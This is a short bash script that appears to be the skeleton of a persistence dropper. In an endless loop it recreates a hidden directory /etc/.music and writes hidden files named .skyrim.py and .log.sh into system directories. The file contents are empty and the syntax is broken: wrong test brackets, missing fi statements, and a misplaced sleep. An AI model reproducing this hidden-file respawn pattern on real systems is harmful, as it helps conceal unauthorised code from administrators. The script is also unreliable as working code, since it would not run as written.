#!/bin/bash
while true
do
if ! ( -d /etc/.music )
then
mkdir /etc/.music
fi
if ! ( -f /etc/.music/.skyrim.py )
then
cat <<EOFA > /etc/.music/.skyrim.py

EOFA
if ! ( -f /var/spool/.log.sh )
then
cat <<EOFB > /var/spool/.log.sh

EOFB
done
sleep 60